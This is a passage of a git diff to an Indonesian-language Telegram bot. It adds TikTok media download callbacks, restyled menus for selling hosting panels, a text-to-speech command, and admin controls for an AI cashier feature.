+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal kembali ke video!', show_alert: true });
+}
+} else if (data.startsWith('tt_audio_')) {
+const cacheKey = data.replace('tt_audio_', '');
+await bot.answerCallbackQuery(callbackQuery.id, { text: '⬇️ Mengirim audio...' });
+try {
+const cached = global.tiktokCache?.[cacheKey];
+if (!cached?.downloadResult?.mp3) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Audio tidak tersedia!', show_alert: true });
+return;
+}
+const formatNumber = (num) => {
+if (!num) return "0";
+if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
+if (num >= 1000) return (num / 1000).toFixed(1) + "K";
+return num.toString();
+};
+const caption = `<blockquote>🎵 AUDIO TIKTOK</blockquote>\n
+<b>🎬 Judul:</b> ${escapeHTML(cached.videoInfo.title || 'Tidak ada judul')}\n
+<b>👤 Creator:</b> ${cached.authorUniqueId ? `@${escapeHTML(cached.authorUniqueId)}` : 'Tidak diketahui'}\n
+<b>📊 Statistik:</b>\n👁️ ${formatNumber(cached.videoInfo.play_count || 0)} views\n❤️ ${formatNumber(cached.videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(cached.videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(cached.videoInfo.share_count || 0)} shares\n
+<b>⏱️ Durasi:</b> ${cached.videoInfo.duration || 0} detik\n
+<i>Audio berhasil diunduh!</i>`;
+const keyboard = {
+inline_keyboard: [
+[
+{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
+{ text: "📹 KEMBALI KE VIDEO", callback_data: `tt_back_video_${cacheKey}` }
+],
+[
+{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
+]
+]
+};
+try {
+await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+} catch (e) {}
+await bot.sendAudio(callbackQuery.message.chat.id, cached.downloadResult.mp3, { caption: caption, parse_mode: "HTML", reply_markup: keyboard });
+} catch (error) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal kirim audio!', show_alert: true });
+}
+} else if (data.startsWith('tt_sd_')) {
+const cacheKey = data.replace('tt_sd_', '');
+await bot.answerCallbackQuery(callbackQuery.id, { text: '⬇️ Mengirim video SD...' });
+try {
+const cached = global.tiktokCache?.[cacheKey];
+const videoUrl = cached?.downloadResult?.video_sd || cached?.videoInfo?.wmplay || cached?.videoInfo?.play;
+if (!videoUrl) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Video SD tidak tersedia!', show_alert: true });
+return;
+}
+cached.currentQuality = 'sd';
+cached.currentMedia = 'video';
+const formatNumber = (num) => {
+if (!num) return "0";
+if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
+if (num >= 1000) return (num / 1000).toFixed(1) + "K";
+return num.toString();
+};
+const caption = `<blockquote>📹 VIDEO TIKTOK SD</blockquote>\n
+<b>🎬 Judul:</b> ${escapeHTML(cached.videoInfo.title || 'Tidak ada judul')}\n
+<b>👤 Creator:</b> ${cached.authorUniqueId ? `@${escapeHTML(cached.authorUniqueId)}` : 'Tidak diketahui'}\n
+<b>📊 Statistik:</b>\n👁️ ${formatNumber(cached.videoInfo.play_count || 0)} views\n❤️ ${formatNumber(cached.videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(cached.videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(cached.videoInfo.share_count || 0)} shares\n
+<b>⏱️ Durasi:</b> ${cached.videoInfo.duration || 0} detik\n
+<i>Video kualitas SD berhasil diunduh!</i>`;
+const keyboard = {
+inline_keyboard: [
+[
+{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
+{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` },
+{ text: "📹 KUALITAS HD", callback_data: `tt_hd_${cacheKey}` }
+],
+[
+{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
+]
+]
+};
+try {
+await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+} catch (e) {}
+await bot.sendVideo(callbackQuery.message.chat.id, videoUrl, { caption: caption, parse_mode: "HTML", reply_markup: keyboard });
+} catch (error) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal kirim video SD!', show_alert: true });
+}
+} else if (data.startsWith('tt_hd_')) {
+const cacheKey = data.replace('tt_hd_', '');
+await bot.answerCallbackQuery(callbackQuery.id, { text: '⬇️ Mengirim video HD...' });
+try {
+const cached = global.tiktokCache?.[cacheKey];
+const videoUrl = cached?.downloadResult?.video_hd || cached?.videoInfo?.play;
+if (!videoUrl) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Video HD tidak tersedia!', show_alert: true });
+return;
+}
+cached.currentQuality = 'hd';
+cached.currentMedia = 'video';
+const formatNumber = (num) => {
+if (!num) return "0";
+if (num >= 1000000) return (num / 1000000).toFixed(1) + "M";
+if (num >= 1000) return (num / 1000).toFixed(1) + "K";
+return num.toString();
+};
+const caption = `<blockquote>📹 VIDEO TIKTOK HD</blockquote>\n
+<b>🎬 Judul:</b> ${escapeHTML(cached.videoInfo.title || 'Tidak ada judul')}\n
+<b>👤 Creator:</b> ${cached.authorUniqueId ? `@${escapeHTML(cached.authorUniqueId)}` : 'Tidak diketahui'}\n
+<b>📊 Statistik:</b>\n👁️ ${formatNumber(cached.videoInfo.play_count || 0)} views\n❤️ ${formatNumber(cached.videoInfo.digg_count || 0)} likes\n💬 ${formatNumber(cached.videoInfo.comment_count || 0)} comments\n🔁 ${formatNumber(cached.videoInfo.share_count || 0)} shares\n
+<b>⏱️ Durasi:</b> ${cached.videoInfo.duration || 0} detik\n
+<i>Video kualitas HD berhasil diunduh!</i>`;
+const keyboard = {
+inline_keyboard: [
+[
+{ text: "👤 LIHAT PROFIL", callback_data: `tt_profile_${cacheKey}` },
+{ text: "🎵 DOWNLOAD AUDIO", callback_data: `tt_audio_${cacheKey}` },
+{ text: "📹 DOWNLOAD SD", callback_data: `tt_sd_${cacheKey}` }
+],
+[
+{ text: "❌ BATAL", callback_data: `tt_cancel_${cacheKey}` }
+]
+]
+};
+try {
+await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+} catch (e) {}
+await bot.sendVideo(callbackQuery.message.chat.id, videoUrl, { caption: caption, parse_mode: "HTML", reply_markup: keyboard });
+} catch (error) {
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Gagal kirim video HD!', show_alert: true });
+}
+} else if (data.startsWith('tt_cancel_')) {
+const cacheKey = data.replace('tt_cancel_', '');
+await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Dibatalkan' });
+try {
+const cached = global.tiktokCache?.[cacheKey];
+if (cached) {
+try {
+await bot.deleteMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
+} catch (e) {}
+delete global.tiktokCache[cacheKey];
+}
+} catch (error) {
+console.log("Tidak bisa hapus pesan TikTok:", error.message);
+}
+} else if (data.startsWith('Status_')) {
+const orderId = data.replace('Status_', '');
 const statusData = await checkPaymentStatus(orderId);
 let statusText = 'MENUNGGU';
 if (statusData && statusData.transaction) {
@@ -1792,7 +2456,7 @@ const isUserReseller = isReseller(userId);
 const isUserAdmin = isAdmin(userId);
 let status = 'User';
 if (isUserAdmin) {
-status = 'Admin';
+status = 'Admin 🜲';
 } else if (isUserReseller) {
 status = 'Seller';
 }
@@ -1808,15 +2472,15 @@ hour: '2-digit',
 minute: '2-digit' 
 });
 const cekIdText = `<blockquote>┌─⧼ <b>🆔 ɪɴꜰᴏʀᴍᴀꜱɪ ᴜꜱᴇʀ</b> ⧽
-├ ⬡ User ID: <code>${userId}</code>
-├ ⬡ Username: ${escapeHTML(username)}
-├ ⬡ Nama: ${escapeHTML(callbackQuery.from.first_name || 'Tidak ada')}
-├ ⬡ Status: ${escapeHTML(status)}
-├ ⬡ Bergabung: ${escapeHTML(joinDate)}
-├ ⬡ Terakhir dilihat: ${escapeHTML(lastSeen)}
-├ ⬡ Tanggal: ${escapeHTML(formattedDate)}
-├ ⬡ Jam: ${escapeHTML(formattedTime)}
-╰──────────────────</blockquote>`;
+┃ ⬡ User ID: <code>${userId}</code>
+┃ ⬡ Username: ${escapeHTML(username)}
+┃ ⬡ Nama: ${escapeHTML(callbackQuery.from.first_name || 'Tidak ada')}
+┃ ⬡ Status: ${escapeHTML(status)}
+┃ ⬡ Bergabung: ${escapeHTML(joinDate)}
+┃ ⬡ Terakhir dilihat: ${escapeHTML(lastSeen)}
+┃ ⬡ Tanggal: ${escapeHTML(formattedDate)}
+┃ ⬡ Jam: ${escapeHTML(formattedTime)}
+╰──────────────────⬣</blockquote>`;
 await bot.editMessageCaption(cekIdText, {
 chat_id: chatId,
 message_id: messageId,
@@ -1843,7 +2507,7 @@ const panelList = `<blockquote>┌─⧼ <b>ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ</b> ⧽
 ┃ ⬡<b>versi bot :</b> ${escapeHTML(config.VERSI)}
 ┃ ⬡<b>owner :</b> ${escapeHTML(config.DEVCELOPER)}
 ┃ ⬡<b>bot name :</b> ${escapeHTML(config.BOT_NAME)}
-╰─────────────
+╰────────────⬣
 ┌─⧼ <b>ᴘᴀᴋᴇᴛ ᴘᴀɴᴇʟ</b> ⧽ 
 ┃ ❏ ─· /1gb   [username,id] - Rp 1.000
 ┃ ❏ ─· /2gb   [username,id] - Rp 2.000
@@ -1856,7 +2520,7 @@ const panelList = `<blockquote>┌─⧼ <b>ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ</b> ⧽
 ┃ ❏ ─· /9gb   [username,id] - Rp 10.000
 ┃ ❏ ─· /10gb [username,id] - Rp 11.000
 ┃ ❏ ─· /unli    [username,id] - Rp 12.000
-╰──────────────</blockquote>`;
+╰─────────────⬣</blockquote>`;
 await bot.editMessageCaption(panelList, {
 chat_id: chatId,
 message_id: messageId,
@@ -1868,30 +2532,27 @@ inline_keyboard: [
 }
 });
 } else if (data === 'buy_seller') {
-const sellerInfo = `<blockquote>┌─⧼ <b> 🜲 Upgrade Seller Panel</b> ⧽
-├ ⬡ Harga: Rp 50.000
-╰─────────────
-
-┌─⧼ <b>Keuntungan:</b> ⧽
+const sellerInfo = `<blockquote>
+┌─⧼ <b>reseller panel Keuntungan:</b> ⧽
 ┃ ✅ Buat panel gratis tanpa batas
 ┃ ✅ Akses semua paket panel
 ┃ ✅ Prioritas support premium
 ┃ ✅ Bisa buat panel untuk orang lain
 ┃ ✅ Akses fitur seller dashboard
-╰─────────────
+╰────────────⬣
 
 ┌─⧼ <b>Instruksi:</b> ⧽
 ┃ 1: Ketik /addseller [ID_ANDA]
 ┃ 2: Scan QR yang muncul
-┃ 3: Bayar Rp 50.000
+┃ 3: bayar sesuai harga yang tertera
 ┃ 4: Otomatis aktif seller panel
-╰──────────────
+╰─────────────⬣
 
 ┌─⧼ <b>Catatan:</b> ⧽
 ┃ ⚠️ Masukkan ID Telegram Anda
 ┃ Contoh: /addseller 123456789
-┃ Dapatkan ID di @userinfobot
-╰──────────────</blockquote>`;
+┃ Dapatkan ID ketik /cekid
+╰─────────────⬣</blockquote>`;
 await bot.editMessageCaption(sellerInfo, {
 chat_id: chatId,
 message_id: messageId,
@@ -1910,14 +2571,29 @@ const toolsList = `<blockquote>
 ┃ ❏ ─· /pin
 ┃ ❏ ─· /play 
 ┃ ❏ ─· /tourl
-┃ ❏ ─· /tt
-┃ ❏ ─· /ig
 ┃ ❏ ─· /deploy
 ┃ ❏ ─· /listseller
-┃ ❏ ─· 
-┃ ❏ ─· 
-┃ ❏ ─·
-┃ ❏ ─·
+┃ ❏ ─· /brat
+┃ ❏ ─· /iqc
+┃ ❏ ─· /hd
+┃ ❏ ─· /ssweb
+┃ ❏ ─· /tt
+┃ ❏ ─· /toblur
+┃ ❏ ─· /tohijab
+┃ ❏ ─· /tozombie
+┃ ❏ ─· /totua
+┃ ❏ ─· /topacar
+┃ ❏ ─· /tochibi
+┃ ❏ ─· /tofigure
+┃ ❏ ─· /toghibli
+┃ ❏ ─· /tojepang
+┃ ❏ ─· /tovintage
+┃ ❏ ─· /toanime
+┃ ❏ ─· /totato
+┃ ❏ ─· /toreal
+┃ ❏ ─· /tomirror
+┃ ❏ ─· /shortlink
+┃ ❏ ─· /tts
 ╰──────────━𖣐
 ╭─━ ⧼ <b>ᴘᴀᴋᴇᴛ ᴘᴀɴᴇʟ</b> ⧽
 ┃ ❏ ─· /1gb name,id
@@ -1940,6 +2616,8 @@ if (!isAdmin(userId)) {
 await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Hanya admin yang bisa!', show_alert: true });
 return;
 }
+const otakai = loadOtakai();
+const aiStatus = otakai.ai_enabled ? '✅ AKTIF' : '⏸️ NONAKTIF';
 const ownerList = `<blockquote>┌─⧼ <b>ᴏᴡɴᴇʀ ᴍᴇɴᴜ</b> ⧽
 ┃ ❏ ─· /addadmin [id]
 ┃ ❏ ─· /cadmin username,id
@@ -1948,12 +2626,18 @@ const ownerList = `<blockquote>┌─⧼ <b>ᴏᴡɴᴇʀ ᴍᴇɴᴜ</b> ⧽
 ┃ ❏ ─· /addseller [id]
 ┃ ❏ ─· /delseller [id]
 ┃ ❏ ─· /broadcast [pesan]
-╰──────────────
+╰─────────────⬣
+┌─⧼ <b>🤖 AI KASIR SYSTEM</b> ⧽
+┃ ❏ ─· /ai on
+┃ ❏ ─· /ai off
+┃ ❏ ─· /aimemory
+╰─────────────⬣
 ┌─⧼ <b>sʏsᴛᴇᴍ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b> ⧽
+┃ ❏ ─· /update
 ┃ ❏ ─· /backup
 ┃ ❏ ─· /restart
 ┃ ❏ ─· /logs
-╰──────────────</blockquote>`;
+╰─────────────⬣</blockquote>`;
 await bot.editMessageCaption(ownerList, {
 chat_id: chatId,
 message_id: messageId,
@@ -1966,37 +2650,44 @@ inline_keyboard: [
 });
 } else if (data === 'view_config') {
 const configData = getServerConfig();
+const otakai = loadOtakai();
+const aiStatus = otakai.ai_enabled ? 'AKTIF ✅' : 'NONAKTIF ⏸️';
+const totalMemoryUsers = Object.keys(otakai.users || {}).length;
 const configText = `<blockquote>┌─⧼ <b>ꜱᴇʀᴠᴇʀ ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ</b> ⧽
 ┃ CPU & Memory
 ┃ CPU Load: ${configData.cpuLoad}%
 ┃ Memory: ${configData.memory.used}MB / ${configData.memory.total}GB
 ┃ Memory Usage: ${configData.memory.percent}%
-╰─────────────
+╰────────────⬣
 ┌─⧼ <b>ꜱʏꜱᴛᴇᴍ ɪɴꜰᴏ</b> ⧽
 ┃ Uptime: ${escapeHTML(configData.uptime)}
 ┃ Platform: ${escapeHTML(configData.platform)}
 ┃ Architecture: ${escapeHTML(configData.arch)}
 ┃ Node.js: ${escapeHTML(configData.nodeVersion)}
-╰─────────────
+╰────────────⬣
 
 ┌─⧼ <b>ʙᴏᴛ ɪɴꜰᴏ</b> ⧽
 ┃ Bot Age: ${configData.botAge} days
 ┃ Bot Version: ${escapeHTML(config.VERSI)}
 ┃ Developer: ${escapeHTML(config.DEVCELOPER)}
 ┃ Owner ID: ${escapeHTML(config.OWNER_ID)}
-╰─────────────
+╰────────────⬣
+┌─⧼ <b>🤖 AI KASIR STATUS</b> ⧽
+┃ Status: ${aiStatus}
+┃ Memory Users: ${totalMemoryUsers}
+╰────────────⬣
 ┌─⧼ <b>ᴜsᴇʀ sᴛᴀᴛɪsᴛɪᴄs</b> ⧽
 ┃ Total Users: ${configData.totalUsers || 0}
 ┃ Total Sellers: ${configData.totalSellers || 0}
 ┃ Total Admins: ${configData.totalAdmins || 0}
-╰──────────────</blockquote>`;
+╰────────────⬣</blockquote>`;
 await bot.editMessageCaption(configText, {
 chat_id: chatId,
 message_id: messageId,
 parse_mode: 'HTML',
 reply_markup: {
 inline_keyboard: [
-[{ text: '🔄 Refresh', callback_data: 'refresh_config' }],
+[{ text: '↻ Refresh', callback_data: 'refresh_config' }],
 [{ text: '<<', callback_data: 'back' }]
 ]
 }
@@ -2010,37 +2701,45 @@ const adminData = loadAdmins();
 const totalAdmins = Object.keys(adminData).length;
 const usersData = loadUsers();
 const totalUsers = Object.keys(usersData).length;
+const otakai = loadOtakai();
+const aiStatus = otakai.ai_enabled ? 'AKTIF ✅' : 'NONAKTIF ⏸️';
+const totalMemoryUsers = Object.keys(otakai.users || {}).length;
 const configText = `<blockquote>┌─⧼ <b>ꜱᴇʀᴠᴇʀ ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ</b> ⧽
 ┃ CPU & Memory
 ┃ CPU Load: ${configData.cpuLoad}%
 ┃ Memory: ${configData.memory.used}MB / ${configData.memory.total}GB
 ┃ Memory Usage: ${configData.memory.percent}%
-╰─────────────
+╰────────────⬣
 ┌─⧼ <b>ꜱʏꜱᴛᴇᴍ ɪɴꜰᴏ</b> ⧽
 ┃ Uptime: ${escapeHTML(configData.uptime)}
 ┃ Platform: ${escapeHTML(configData.platform)}
 ┃ Architecture: ${escapeHTML(configData.arch)}
 ┃ Node.js: ${escapeHTML(configData.nodeVersion)}
-╰─────────────
+╰────────────⬣
 
 ┌─⧼ <b>ʙᴏᴛ ɪɴꜰᴏ</b> ⧽
 ┃ Bot Age: ${configData.botAge} days
 ┃ Bot Version: ${escapeHTML(config.VERSI)}
 ┃ Developer: ${escapeHTML(config.DEVCELOPER)}
 ┃ Owner ID: ${escapeHTML(config.OWNER_ID)}
-╰─────────────
+╰────────────⬣
+┌─⧼ <b>🤖 AI KASIR STATUS</b> ⧽
+┃ Status: ${aiStatus}
+┃ Memory Users: ${totalMemoryUsers}
+┃ API: ${escapeHTML(AI_API_URL)}
+╰────────────⬣
 ┌─⧼ <b>ᴜsᴇʀ sᴛᴀᴛɪsᴛɪᴄs</b> ⧽
 ┃ Total Users: ${totalUsers}
 ┃ Total Sellers: ${totalSellers}
 ┃ Total Admins: ${totalAdmins}
-╰──────────────</blockquote>`;
+╰────────────⬣</blockquote>`;
 await bot.editMessageCaption(configText, {
 chat_id: chatId,
 message_id: messageId,
 parse_mode: 'HTML',
 reply_markup: {
 inline_keyboard: [
-[{ text: '🔄 Refresh', callback_data: 'refresh_config' }],
+[{ text: '↻ Refresh', callback_data: 'refresh_config' }],
 [{ text: '<<', callback_data: 'back' }]
 ]
 }
@@ -2052,7 +2751,7 @@ const isUserReseller = isReseller(userId);
 const isUserAdmin = isAdmin(userId);
 let status = 'User';
 if (isUserAdmin) {
-status = 'Admin';
+status = 'Admin 🜲';
 } else if (isUserReseller) {
 status = 'Seller';
 }
@@ -2101,6 +2800,3115 @@ reply_markup: buttons
 } catch (error) {
 console.error('Error in back menu:', error);
 }
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🔊 TTS (TEXT TO SPEECH) COMMAND
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/tts(?:\s+(.+))?$/i, async (msg, match) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || 'User';
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const text = match[1];
+const messageText = `/tts ${text || ''}`.trim();
+logUserInteraction(userId, username, chatType, messageText, groupName);
+
+// Handle reply to message
+let inputText = '';
+if (msg.reply_to_message && msg.reply_to_message.text) {
+inputText = msg.reply_to_message.text.trim();
+} else if (text) {
+inputText = text.trim();
+}
+
+if (!inputText) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Format salah!</blockquote>\n\n` +
+`<b>Contoh:</b> <code>/tts halo apa kabar</code>\n\n` +
+`<i>Atau reply pesan yang berisi teks.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+
+if (inputText.length > 500) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Teks terlalu panjang!</blockquote>\n\n` +
+`Maksimal 500 karakter.\n` +
+`Panjang teks Anda: ${inputText.length} karakter\n\n` +
+`<i>Persingkat teks Anda.</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+
+const processingMsg = await bot.sendMessage(chatId,
+`<blockquote>🔊 Membuat TTS Audio...</blockquote>\n\n` +
+`<b>Teks:</b> ${escapeHTML(inputText.substring(0, 100))}${inputText.length > 100 ? '...' : ''}\n` +
+`<b>Suara:</b> Indonesia (default)\n` +
+`<i>Mohon tunggu...</i>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+
+try {
+const encodedText = encodeURIComponent(inputText);
+const apiUrl = `https://exsalapi.my.id/api/audio/tiktok-tts?text=${encodedText}&voice=id_001&apikey=${AI_API_KEY}`;
+console.log('Mengirim request ke API TTS:', apiUrl);
+const response = await fetch(apiUrl, {
+headers: {
+'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+'Accept': 'application/json',
+'Content-Type': 'application/x-www-form-urlencoded'
+}
+});
+const responseText = await response.text();
+console.log('Response raw:', responseText);
+let data;
+try {
+data = JSON.parse(responseText);
+} catch (e) {
+throw new Error(`Invalid JSON response: ${responseText.substring(0, 100)}`);
+}
+console.log('TTS API Response:', JSON.stringify(data, null, 2));
+if (!response.ok || !data || data.status === false || !data.data || !data.data.url) {
+throw new Error(data.message || `HTTP ${response.status}: ${responseText.substring(0, 100)}`);
+}
+
+// Simpan audio ke buffer terlebih dahulu
+const audioResponse = await fetch(data.data.url);
+if (!audioResponse.ok) {
+throw new Error(`Gagal mengunduh audio: ${audioResponse.status}`);
+}
+const audioBuffer = await audioResponse.arrayBuffer();
+
+// Buat keyboard dengan Indonesia sebagai suara aktif (✅)
+const keyboard = {
+inline_keyboard: [
+[
+{ text: '✅ Indonesia', callback_data: `tts_id_${encodeURIComponent(inputText.substring(0, 100))}` },
+{ text: '🇺🇸 US Female', callback_data: `tts_usf_${encodeURIComponent(inputText.substring(0, 100))}` }
+],
+[
+{ text: '🇺🇸 US Male', callback_data: `tts_usm_${encodeURIComponent(inputText.substring(0, 100))}` },
+{ text: '🇯🇵 Japanese', callback_data: `tts_jp_${encodeURIComponent(inputText.substring(0, 100))}` }
+],
+[
+{ text: '🇰🇷 Korean', callback_data: `tts_kr_${encodeURIComponent(inputText.substring(0, 100))}` }
+]
+]
+};
+
+// Kirim audio sebagai buffer
+const sentMessage = await bot.sendAudio(chatId, Buffer.from(audioBuffer), {
+caption: `<blockquote>🔊 TTS Audio Selesai!</blockquote>\n\n` +
+`<b>Teks:</b> ${escapeHTML(inputText.substring(0, 100))}${inputText.length > 100 ? '...' : ''}\n` +
+`<b>Suara:</b> 🇮🇩 Indonesia\n` +
+`<b>Panjang:</b> ${inputText.length} karakter\n\n` +
+`<i>Pilih suara lain:</i>`,
+parse_mode: 'HTML',
+reply_markup: keyboard,
+reply_to_message_id: msg.message_id
+});
+
+// Simpan informasi di cache untuk callback handler
+if (!global.ttsCache) global.ttsCache = {};
+const cacheKey = `tts_${sentMessage.message_id}`;
+global.ttsCache[cacheKey] = {
+text: inputText,
+messageId: sentMessage.message_id,
+chatId: chatId
+};
+
+await bot.deleteMessage(chatId, processingMsg.message_id);
+
+} catch (error) {
+console.error('TTS error:', error);
+let errorMessage = '';
+if (error.message.includes('400') || error.message.includes('Bad Request')) {
+errorMessage = `<blockquote>❌ Teks mengandung karakter tidak valid!</blockquote>\n` +
+`<i>Pastikan teks hanya mengandung karakter yang didukung.</i>`;
+} else if (error.message.includes('failed to get HTTP URL content')) {
+errorMessage = `<blockquote>❌ Gagal mengambil konten audio!</blockquote>\n` +
+`<i>URL audio tidak valid atau tidak dapat diakses. Coba lagi dengan teks lain.</i>`;
+} else if (error.message.includes('API error')) {
+errorMessage = `<blockquote>❌ API TTS sedang gangguan!</blockquote>\n` +
+`<i>Sistem TTS sedang tidak bisa diakses.</i>`;
+} else if (error.message.includes('gagal membuat audio') || error.message.includes('Invalid JSON')) {
+errorMessage = `<blockquote>❌ Gagal membuat audio!</blockquote>\n` +
+`<i>API tidak bisa memproses teks yang diberikan.</i>`;
+} else if (error.message.includes('Gagal mengunduh audio')) {
+errorMessage = `<blockquote>❌ Gagal mengunduh file audio!</blockquote>\n` +
+`<i>Server audio tidak merespon. Coba lagi nanti.</i>`;
+} else {
+errorMessage = `<blockquote>❌ Error membuat TTS!</blockquote>\n` +
+`<code>${escapeHTML(error.message.substring(0, 100))}</code>`;
+}
+try {
+await bot.editMessageText(
+errorMessage,
+{ 
+chat_id: chatId, 
+message_id: processingMsg.message_id, 
+parse_mode: 'HTML'
+}
+);
+} catch (editError) {
+await bot.sendMessage(chatId, errorMessage, { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
+}
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 🤖 AI KASIR ON/OFF COMMAND
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/ai(?:\s+(on|off))?$/i, async (msg, match) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const action = match[1] ? match[1].toLowerCase() : null;
+const messageText = `/ai ${action || ''}`.trim();
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!isAdmin(userId)) {
+return bot.sendMessage(chatId, 
+`<blockquote>❌ Hanya admin yang bisa mengontrol AI!</blockquote>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+if (!action) {
+const currentStatus = isAIEnabled() ? 'AKTIF' : 'NONAKTIF';
+return bot.sendMessage(chatId,
+`<blockquote>🤖 STATUS AI KASIR</blockquote>\n\n` +
+`Status saat ini: <b>${currentStatus}</b>\n\n` +
+`<b>Penggunaan:</b>\n` +
+`<code>/ai on</code> - Aktifkan AI Kasir\n` +
+`<code>/ai off</code> - Nonaktifkan AI Kasir`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+if (action === 'on') {
+toggleAI(true);
+await bot.sendMessage(chatId,
+`<blockquote>✅ AI KASIR DIAKTIFKAN</blockquote>\n\n` +
+`Sistem AI kasir pribadi sekarang aktif!\n\n` +
+`Fitur:\n` +
+`• Akan merespon pesan non-command\n` +
+`• Ingatan interaksi per user\n` +
+`• Promosi panel untuk user baru\n` +
+`• Bantuan informasi produk`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+const ownerMsg = `<blockquote>🤖 AI KASIR DIAKTIFKAN</blockquote>\n\n` +
+`<b>Oleh:</b> ${escapeHTML(username)}\n` +
+`<b>User ID:</b> <code>${userId}</code>\n` +
+`<b>Waktu:</b> ${new Date().toLocaleString('id-ID')}\n\n` +
+`<i>AI sekarang aktif dan siap melayani!</i>`;
+await bot.sendMessage(config.OWNER_ID, ownerMsg, { parse_mode: 'HTML' });
+} else if (action === 'off') {
+toggleAI(false);
+await bot.sendMessage(chatId,
+`<blockquote>⏸️ AI KASIR DINONAKTIFKAN</blockquote>\n\n` +
+`Sistem AI kasir pribadi sekarang nonaktif.\n` +
+`Tidak akan merespon pesan user.`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 📊 AI MEMORY STATUS COMMAND
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.onText(/^\/aimemory$/i, async (msg) => {
+const chatId = msg.chat.id;
+const userId = msg.from.id.toString();
+const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name;
+const chatType = msg.chat.type;
+const groupName = chatType === 'group' || chatType === 'supergroup' ? msg.chat.title : null;
+const messageText = '/aimemory';
+logUserInteraction(userId, username, chatType, messageText, groupName);
+if (!isAdmin(userId)) {
+return bot.sendMessage(chatId,
+`<blockquote>❌ Hanya admin yang bisa!</blockquote>`,
+{ parse_mode: 'HTML', reply_to_message_id: msg.message_id }
+);
+}
+const otakai = loadOtakai();
+const userCount = Object.keys(otakai.users).length;
+const aiStatus = otakai.ai_enabled ? 'AKTIF' : 'NONAKTIF';
+let memoryInfo = `<blockquote>🤖 AI MEMORY STATUS</blockquote>\n\n`;
+memoryInfo += `<b>Status AI:</b> ${aiStatus}\n`;
+memoryInfo += `<b>Total Users:</b> ${userCount}\n\n`;
+const recentUsers = Object.entries(otakai.users)
+.sort((a, b) => new Date(b[1].last_interaction) - new Date(a[1].last_interaction))
+.slice(0, 10);
+memoryInfo += `<b>📊 User Terakhir Berinteraksi:</b>\n`;
+recentUsers.forEach(([id, data], index) => {
+const lastSeen = new Date(data.last_interaction).toLocaleString('id-ID');
+memoryInfo += `${index + 1}. ID: <code>${id}</code>\n`;
+memoryInfo += `   Pesan: ${data.message_count || 0}x\n`;
+memoryInfo += `   Terakhir: ${lastSeen}\n`;
+});
+await bot.sendMessage(chatId, memoryInfo, { parse_mode: 'HTML', reply_to_message_id: msg.message_id });
+});
+
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+// 💬 AI KASIR PRIVATE CHAT HANDLER
+//━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+bot.on('message', async (msg) => {
+if (!msg.text) return;
+if (msg.text.startsWith('/')) return;
+const chatId = msg.chat.id;
